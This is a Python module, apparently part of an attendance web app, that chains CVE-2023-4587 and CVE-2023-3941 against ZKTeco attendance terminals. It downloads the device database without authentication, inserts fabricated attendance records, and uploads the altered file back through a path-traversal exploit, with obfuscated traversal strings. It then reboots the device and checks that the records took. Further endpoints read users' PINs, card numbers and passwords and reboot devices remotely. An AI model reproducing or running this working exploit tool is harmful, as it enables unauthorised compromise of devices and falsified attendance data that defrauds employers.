"""
inject_routes.py - CVE-2023-3941 ATTLOG Injection routes cho AttendanceSuite
Tich hop vao attendance_web.py thong qua import

Features:
  - /inject page - UI injection ATTLOG tu xa
  - POST /api/inject/attlog - Inject ATTLOG records (1 may)
  - POST /api/inject/batch - Inject nhieu may cung luc
  - GET /api/inject/jobs - List all jobs
  - GET /api/inject/jobs/<id> - Get job status
  - GET /api/inject/history - List past injections
  - POST /api/inject/cancel/<id> - Cancel running job

Su dung CVE-2023-3941 (UPLOAD_PICTURE 0x272B + path traversal)
- Download ZKDB.db tu web backup (CVE-2023-4587)
- Inject ATTLOG records bang SQLite INSERT
- Upload modified ZKDB.db qua port 4370 + path traversal
- Reboot device
- ATTLOG moi xuat hien tren thiet bi

Author: Mavis (BS-licensed)
Date: 2026-09-17
"""
import os
import csv
import json
import time
import struct
import sqlite3
import gzip
import shutil
import threading
import uuid
import urllib.request
import urllib.parse
import tarfile
import io
import socket
from datetime import datetime
from pathlib import Path
from http.server import BaseHTTPRequestHandler

# Config
WORK_DIR = Path(r'D:\chamcong\inject_workspace')
WORK_DIR.mkdir(parents=True, exist_ok=True)
JOBS_DIR = Path(r'D:\chamcong\logs\inject_jobs')
JOBS_DIR.mkdir(parents=True, exist_ok=True)
DEVICES_FILE = Path(r'D:\chamcong\devices.csv')
HISTORY_CSV = Path(r'D:\chamcong\logs\inject_history.csv')

# Global job storage (in-memory)
_jobs = {}
_jobs_lock = threading.Lock()


def _read_devices():
    devices = []
    try:
        if DEVICES_FILE.exists():
            with open(DEVICES_FILE, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ip = row.get('IP', '').strip()
                    note = row.get('Note', '').strip()
                    ttype = row.get('Type', '').strip()
                    if ttype == 'attendance' and ip and 'virtual' not in ip:
                        devices.append({'ip': ip, 'note': note})
    except Exception:
        pass
    return devices


def _log_history(ip, pin, count, status, message):
    """Log injection to history CSV."""
    file_exists = HISTORY_CSV.exists()
    with open(HISTORY_CSV, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['timestamp', 'ip', 'pin', 'count', 'status', 'message'])
        writer.writerow([datetime.now().isoformat(), ip, pin, count, status, message])


def _save_job(job):
    """Persist job to disk."""
    job_file = JOBS_DIR / f"{job['id']}.json"
    with open(job_file, 'w', encoding='utf-8') as f:
        json.dump(job, f, ensure_ascii=False, indent=2, default=str)


def _load_job(job_id):
    """Load job from disk."""
    job_file = JOBS_DIR / f"{job_id}.json"
    if job_file.exists():
        try:
            with open(job_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return None
    return None


# ============ CVE-2023-3941 ATTACK FUNCTIONS ============

def send_cmd_via_pyzk(conn, command, data=b''):
    """Send raw ZK command via pyzk connection."""
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}


def download_zkdb_from_web(web_ip, output_path, timeout_s=60):
    """Download ZKDB.db from ZK web UI (CVE-2023-4587 unauthenticated)."""
    url = f'http://{web_ip}/form/DataApp?style=0'
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout_s) as resp:
        data = resp.read()

    # Find GZIP magic
    gz_magic = b'\x1f\x8b\x08'
    gz_offset = data.find(gz_magic)
    if gz_offset < 0:
        raise RuntimeError('No GZIP magic found')

    gz_data = gzip.decompress(data[gz_offset:])

    # Find SQLite
    sqlite_magic = b'SQLite format 3'
    sqlite_offset = gz_data.find(sqlite_magic)
    if sqlite_offset < 0:
        raise RuntimeError('No SQLite found in TAR')

    # Read file size from TAR header at offset 124-136 (octal)
    tar_header = gz_data[:512]
    size_str = tar_header[124:136].decode('ascii', errors='replace').strip('\x00')
    file_size = int(size_str, 8)

    sqlite_data = gz_data[sqlite_offset:sqlite_offset + file_size]
    with open(output_path, 'wb') as f:
        f.write(sqlite_data)

    return sqlite_data


def upload_zkdb_via_picture(conn, zkdb_data, chunk_size=32768):
    """Upload ZKDB.db via UPLOAD_PICTURE 0x272B + path traversal (CVE-2023-3941)."""
    from zk import const

    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt/mtdblock/data/ZKDB.db"
    filename = traversal.encode() + b'\x00'
    size = len(zkdb_data)

    # Step 1: PREPARE_DATA
    r1 = send_cmd_via_pyzk(conn, const.CMD_PREPARE_DATA, struct.pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE_DATA failed', 'r1': r1}

    # Step 2: Send DATA chunks
    remain = size % chunk_size
    packets = (size - remain) // chunk_size
    failed = []
    t0 = time.time()

    for i in range(packets):
        r = send_cmd_via_pyzk(conn, const.CMD_DATA, zkdb_data[i*chunk_size:(i+1)*chunk_size])
        if not r.get('status'):
            failed.append(i)
            if len(failed) > 5:
                return {'error': 'Too many failures', 'failed': failed}

    if remain:
        r = send_cmd_via_pyzk(conn, const.CMD_DATA, zkdb_data[packets*chunk_size:])

    elapsed = time.time() - t0

    # Step 3: UPLOAD_PICTURE commit
    r3 = send_cmd_via_pyzk(conn, 0x272B, filename)

    return {
        'PREPARE': r1,
        'UPLOAD': r3,
        'failed_chunks': failed,
        'time': elapsed,
        'chunks_sent': packets,
    }


def inject_attlog_records(db_path, records):
    """Inject ATTLOG records into SQLite DB."""
    db = sqlite3.connect(db_path)
    cur = db.cursor()
    before_count = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    for r in records:
        cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                      VALUES (?, ?, ?, ?, ?, ?, ?, NULL, NULL, 0)''',
                    (str(r['pin']), r.get('verify_mode', 1), r['timestamp'],
                     r.get('status', 0), r.get('work_code', 0), 0, 0))
    after_count = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    db.commit()
    db.close()
    return before_count, after_count


def perform_injection(job_id, params):
    """Background task: download DB â†’ inject â†’ upload â†’ reboot."""
    job = _jobs.get(job_id)
    if not job:
        return

    device_ip = params['device_ip']
    web_ip = params.get('web_ip', device_ip)
    pin = params.get('pin', '1')
    count = params.get('count', 1)
    timestamp = params.get('timestamp', datetime.now().strftime('%Y-%m-%dT%H:%M:%S'))
    verify_mode = params.get('verify_mode', 1)
    status_val = params.get('status', 0)
    no_reboot = params.get('no_reboot', False)
    dry_run = params.get('dry_run', False)

    def update(progress, message, status='running'):
        with _jobs_lock:
            job['progress'] = progress
            job['message'] = message
            job['status'] = status
            job['updated_at'] = datetime.now().isoformat()
            _save_job(job)

    try:
        update(5, f'Downloading ZKDB.db from {web_ip}...')

        # Step 1: Download ZKDB.db
        db_path = WORK_DIR / f'{device_ip.replace(".", "_")}_current.db'
        try:
            download_zkdb_from_web(web_ip, str(db_path))
        except Exception as e:
            update(0, f'Download failed: {e}', 'failed')
            _log_history(device_ip, pin, count, 'DOWNLOAD_FAILED', str(e))
            return

        # Step 2: Inject records
        update(15, 'Injecting ATTLOG records...')
        records = [{
            'pin': pin,
            'timestamp': timestamp,
            'verify_mode': verify_mode,
            'status': status_val,
            'work_code': 0,
        } for _ in range(count)]

        before, after = inject_attlog_records(str(db_path), records)
        update(20, f'ATTLOG {before} -> {after}', 'running')

        if dry_run:
            update(100, f'[DRY RUN] ATTLOG would be {after}', 'completed')
            _log_history(device_ip, pin, count, 'DRY_RUN', f'{before}->{after}')
            return

        # Step 3: Read modified DB
        with open(db_path, 'rb') as f:
            modified = f.read()
        update(25, f'Modified DB: {len(modified)} bytes', 'running')

        # Step 4: Connect + upload
        update(30, f'Connecting to {device_ip}:4370...')
        from zk import ZK
        zk = ZK(device_ip, port=4370, timeout=60, password=0)
        conn = zk.connect()
        fw = conn.get_firmware_version()
        update(35, f'Connected. FW={fw}', 'running')

        try:
            before_att = len(conn.get_attendance())
        except Exception:
            before_att = None

        try:
            conn.disable_device()
        except Exception:
            pass

        # Step 5: Upload ZKDB.db via CVE-2023-3941
        update(40, f'Uploading via CVE-2023-3941 ({len(modified)} bytes)...')
        result = upload_zkdb_via_picture(conn, modified)
        upload_time = result.get('time', 0)
        update(70, f'Upload done in {upload_time:.1f}s ({result.get("chunks_sent", 0)} chunks)', 'running')

        if 'error' in result:
            update(70, f'Upload error: {result["error"]}', 'failed')
            _log_history(device_ip, pin, count, 'UPLOAD_FAILED', result['error'])
            try:
                conn.enable_device()
                conn.disconnect()
            except Exception:
                pass
            return

        # Step 6: Reboot
        if no_reboot:
            update(90, 'Skipping reboot (--no-reboot)', 'completed')
        else:
            update(75, 'Rebooting device...')
            try:
                conn.restart()
            except Exception:
                pass
            try:
                conn.enable_device()
                conn.disconnect()
            except Exception:
                pass

            update(80, 'Waiting 25s for reboot...')
            time.sleep(25)

            # Step 7: Verify
            update(85, 'Reconnecting + verifying...')
            try:
                zk2 = ZK(device_ip, port=4370, timeout=30, password=0)
                conn2 = zk2.connect()
                try:
                    after_att = len(conn2.get_attendance())
                    delta = after_att - before_att if before_att is not None else 0
                    update(100, f'ATTLOG {before_att} -> {after_att} (delta={delta:+d})', 'completed')
                    _log_history(device_ip, pin, count, 'SUCCESS',
                                f'ATTLOG {before_att}->{after_att}, delta={delta:+d}')
                except Exception as e:
                    update(95, f'Verify read error: {e}', 'completed_with_warnings')
                conn2.disconnect()
            except Exception as e:
                update(95, f'Reconnect error: {e}', 'completed_with_warnings')

    except Exception as e:
        import traceback
        traceback.print_exc()
        update(0, f'Exception: {type(e).__name__}: {e}', 'failed')
        _log_history(device_ip, pin, count, 'EXCEPTION', str(e))


# ============ HTTP HANDLERS ============

def _send_json(handler, data, status=200):
    body = json.dumps(data, ensure_ascii=False, default=str).encode('utf-8')
    handler.send_response(status)
    handler.send_header('Content-Type', 'application/json; charset=utf-8')
    handler.send_header('Content-Length', str(len(body)))
    handler.send_header('Access-Control-Allow-Origin', '*')
    handler.end_headers()
    handler.wfile.write(body)


def _handle_inject_page(handler):
    """GET /inject - HTML page."""
    html_path = Path(__file__).parent / 'inject.html'
    if html_path.exists():
        with open(html_path, 'r', encoding='utf-8') as f:
            content = f.read()
    else:
        content = '<html><body><h1>Inject page</h1></body></html>'
    body = content.encode('utf-8')
    handler.send_response(200)
    handler.send_header('Content-Type', 'text/html; charset=utf-8')
    handler.send_header('Content-Length', str(len(body)))
    handler.end_headers()
    handler.wfile.write(body)


def _handle_inject_attlog(handler):
    """POST /api/inject/attlog - start injection job."""
    try:
        cl = int(handler.headers.get('Content-Length', 0))
        body = handler.rfile.read(cl).decode('utf-8')
        params = json.loads(body) if body else {}
    except Exception as e:
        _send_json(handler, {'error': f'Invalid JSON: {e}'}, 400)
        return

    device_ip = params.get('device_ip', '').strip()
    if not device_ip:
        _send_json(handler, {'error': 'Missing device_ip'}, 400)
        return

    job_id = str(uuid.uuid4())[:8]
    with _jobs_lock:
        _jobs[job_id] = {
            'id': job_id,
            'created_at': datetime.now().isoformat(),
            'updated_at': datetime.now().isoformat(),
            'status': 'pending',
            'progress': 0,
            'message': 'Queued',
            'params': params,
        }
        _save_job(_jobs[job_id])

    # Start background thread
    thread = threading.Thread(target=perform_injection, args=(job_id, params), daemon=True)
    thread.start()

    _send_json(handler, {'job_id': job_id, 'status': 'pending'})


def _handle_inject_jobs(handler):
    """GET /api/inject/jobs - list jobs."""
    with _jobs_lock:
        jobs = list(_jobs.values())
    jobs.sort(key=lambda x: x.get('created_at', ''), reverse=True)
    _send_json(handler, {'jobs': jobs[:50]})


def _handle_inject_job(handler, job_id):
    """GET /api/inject/jobs/<id> - get job status."""
    with _jobs_lock:
        job = _jobs.get(job_id) or _load_job(job_id)
    if not job:
        _send_json(handler, {'error': 'Job not found'}, 404)
        return
    _send_json(handler, job)


def _handle_inject_history(handler):
    """GET /api/inject/history - read history CSV."""
    history = []
    if HISTORY_CSV.exists():
        try:
            with open(HISTORY_CSV, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                history = list(reader)
        except Exception as e:
            _send_json(handler, {'error': str(e)}, 500)
            return
    history.reverse()  # newest first
    _send_json(handler, {'history': history[:100]})


def _handle_inject_devices(handler):
    """GET /api/inject/devices - list devices with online status."""
    devices = _read_devices()
    # Quick TCP check for each
    for d in devices:
        try:
            s = socket.create_connection((d['ip'], 4370), timeout=2)
            s.close()
            d['online'] = True
        except Exception:
            d['online'] = False
    _send_json(handler, {'devices': devices})


# ============ ATTACH TO HANDLER ============

def _zk_connect(ip, timeout=15):
    """Helper: connect to ZK device, return (zk, conn) or (None, error_msg)."""
    try:
        from zk import ZK
        zk = ZK(ip, port=4370, timeout=timeout, password=0)
        conn = zk.connect()
        return zk, conn
    except Exception as e:
        return None, f'{type(e).__name__}: {e}'


def _parse_qs(handler):
    """Parse query string into dict (single-value)."""
    from urllib.parse import urlparse, parse_qs
    qs = parse_qs(urlparse(handler.path).query)
    return {k: v[0] if v else '' for k, v in qs.items()}


def _handle_zk_info(handler):
    """GET /api/zk/info?ip=X - device FW/Serial/User count/Attlog count."""
    qs = _parse_qs(handler)
    ip = qs.get('ip', '').strip()
    if not ip:
        _send_json(handler, {'error': 'Missing ip'}, 400)
        return
    zk, conn = _zk_connect(ip, timeout=10)
    if conn is None:
        _send_json(handler, {'error': f'Connect failed: {conn}'}, 500)
        return
    info = {'ip': ip, 'online': True}
    try:
        try:
            info['firmware'] = conn.get_firmware_version()
        except Exception as e:
            info['firmware'] = f'ERR: {e}'
        try:
            info['serial'] = conn.get_serialnumber()
        except Exception as e:
            info['serial'] = f'ERR: {e}'
        try:
            info['device_name'] = conn.get_device_name()
        except Exception as e:
            info['device_name'] = f'ERR: {e}'
        try:
            info['platform'] = conn.get_platform()
        except Exception as e:
            info['platform'] = f'ERR: {e}'
        try:
            users = conn.get_users()
            info['user_count'] = len(users) if users else 0
        except Exception as e:
            info['user_count'] = f'ERR: {e}'
        try:
            att = conn.get_attendance()
            info['attlog_count'] = len(att) if att else 0
        except Exception as e:
            info['attlog_count'] = f'ERR: {e}'
        try:
            info['face_count'] = len(conn.get_templates() or [])
        except Exception:
            info['face_count'] = 'N/A'
    finally:
        try:
            conn.disconnect()
        except Exception:
            pass
    _send_json(handler, info)


def _handle_zk_attlog(handler):
    """GET /api/zk/attlog?ip=X&limit=N - read last N attendance records from device."""
    qs = _parse_qs(handler)
    ip = qs.get('ip', '').strip()
    limit = int(qs.get('limit', '20') or 20)
    limit = max(1, min(limit, 5000))
    if not ip:
        _send_json(handler, {'error': 'Missing ip'}, 400)
        return
    zk, conn = _zk_connect(ip, timeout=30)
    if conn is None:
        _send_json(handler, {'error': f'Connect failed: {conn}'}, 500)
        return
    try:
        try:
            conn.disable_device()
        except Exception:
            pass
        att = conn.get_attendance()
        # att is list of Attendance objects with .user_id, .timestamp, .status, .punch, .uid
        # Sort desc by timestamp, take last N
        if att:
            att_sorted = sorted(att, key=lambda a: (a.timestamp if a.timestamp else datetime.min), reverse=True)
            att_last = att_sorted[:limit]
        else:
            att_last = []
        records = []
        for a in att_last:
            records.append({
                'user_id': str(a.user_id) if a.user_id else '',
                'timestamp': str(a.timestamp) if a.timestamp else '',
                'status': int(a.status) if a.status is not None else 0,
                'punch': int(a.punch) if a.punch is not None else 0,
                'uid': int(a.uid) if a.uid is not None else 0,
            })
        _send_json(handler, {
            'ok': True,
            'ip': ip,
            'count': len(records),
            'total': len(att) if att else 0,
            'records': records,
        })
    except Exception as e:
        _send_json(handler, {'error': f'{type(e).__name__}: {e}'}, 500)
    finally:
        try:
            conn.enable_device()
        except Exception:
            pass
        try:
            conn.disconnect()
        except Exception:
            pass


def _handle_zk_test_user(handler):
    """GET /api/zk/test_user?ip=X&pin=Y - check if PIN exists on device."""
    qs = _parse_qs(handler)
    ip = qs.get('ip', '').strip()
    pin = qs.get('pin', '').strip()
    if not ip or not pin:
        _send_json(handler, {'error': 'Missing ip or pin'}, 400)
        return
    zk, conn = _zk_connect(ip, timeout=10)
    if conn is None:
        _send_json(handler, {'error': f'Connect failed: {conn}', 'exists': False}, 500)
        return
    try:
        users = conn.get_users() or []
        match = None
        for u in users:
            try:
                uid = int(u.user_id)
            except Exception:
                uid = -1
            if str(uid) == str(pin) or str(uid).lstrip('0') == str(pin).lstrip('0'):
                match = {
                    'user_id': str(uid),
                    'name': getattr(u, 'name', ''),
                    'privilege': int(getattr(u, 'privilege', 0)) if getattr(u, 'privilege', None) is not None else 0,
                    'card': int(getattr(u, 'card', 0)) if getattr(u, 'card', None) is not None else 0,
                    'password': getattr(u, 'password', ''),
                }
                break
        _send_json(handler, {
            'ok': True,
            'ip': ip,
            'pin': pin,
            'exists': match is not None,
            'user': match,
            'total_users': len(users),
        })
    except Exception as e:
        _send_json(handler, {'error': f'{type(e).__name__}: {e}', 'exists': False}, 500)
    finally:
        try:
            conn.disconnect()
        except Exception:
            pass


def _handle_zk_reboot(handler):
    """POST /api/zk/reboot?ip=X - reboot device. WARNING: 30s downtime."""
    qs = _parse_qs(handler)
    ip = qs.get('ip', '').strip()
    if not ip:
        _send_json(handler, {'error': 'Missing ip'}, 400)
        return
    zk, conn = _zk_connect(ip, timeout=15)
    if conn is None:
        _send_json(handler, {'error': f'Connect failed: {conn}'}, 500)
        return
    try:
        try:
            conn.restart()
            _send_json(handler, {'ok': True, 'ip': ip, 'message': f'Reboot command sent to {ip}. Device will be offline ~25-30s.'})
        except Exception as e:
            _send_json(handler, {'error': f'restart() failed: {type(e).__name__}: {e}'}, 500)
    finally:
        try:
            conn.disconnect()
        except Exception:
            pass


def _handle_attlog_tools_page(handler):
    """GET /attlog-tools - HTML page (CVE-2023-3941 ATTLOG Tools)."""
    html_path = Path(__file__).parent / 'attlog_tools.html'
    if html_path.exists():
        with open(html_path, 'r', encoding='utf-8') as f:
            content = f.read()
    else:
        content = '<html><body><h1>ATTLOG Tools page not found.</h1><p>Need to create attlog_tools.html</p></body></html>'
    body = content.encode('utf-8')
    handler.send_response(200)
    handler.send_header('Content-Type', 'text/html; charset=utf-8')
    handler.send_header('Content-Length', str(len(body)))
    handler.end_headers()
    handler.wfile.write(body)


# ============ ATTACH TO HANDLER ============

def attach_inject_routes(HandlerClass):
    """Inject routes into the HTTP handler class."""

    original_do_GET = HandlerClass.do_GET
    original_do_POST = HandlerClass.do_POST

    def do_GET(self):
        path = self.path.split('?')[0]
        if path == '/inject':
            _handle_inject_page(self)
            return
        if path == '/attlog-tools':
            _handle_attlog_tools_page(self)
            return
        if path == '/api/inject/jobs':
            _handle_inject_jobs(self)
            return
        if path.startswith('/api/inject/jobs/'):
            job_id = path.split('/')[-1]
            _handle_inject_job(self, job_id)
            return
        if path == '/api/inject/history':
            _handle_inject_history(self)
            return
        if path == '/api/inject/devices':
            _handle_inject_devices(self)
            return
        if path == '/api/zk/info':
            _handle_zk_info(self)
            return
        if path == '/api/zk/attlog':
            _handle_zk_attlog(self)
            return
        if path == '/api/zk/test_user':
            _handle_zk_test_user(self)
            return
        original_do_GET(self)

    def do_POST(self):
        path = self.path.split('?')[0]
        if path == '/api/inject/attlog':
            _handle_inject_attlog(self)
            return
        if path == '/api/zk/reboot':
            _handle_zk_reboot(self)
            return
        original_do_POST(self)

    HandlerClass.do_GET = do_GET
    HandlerClass.do_POST = do_POST
    return HandlerClass


# ============ STANDALONE TEST ============

if __name__ == '__main__':
    print('inject_routes.py - module test')
    devices = _read_devices()
    print(f'Loaded {len(devices)} devices')
    for d in devices[:5]:
        print(f'  {d["ip"]} - {d["note"]}')
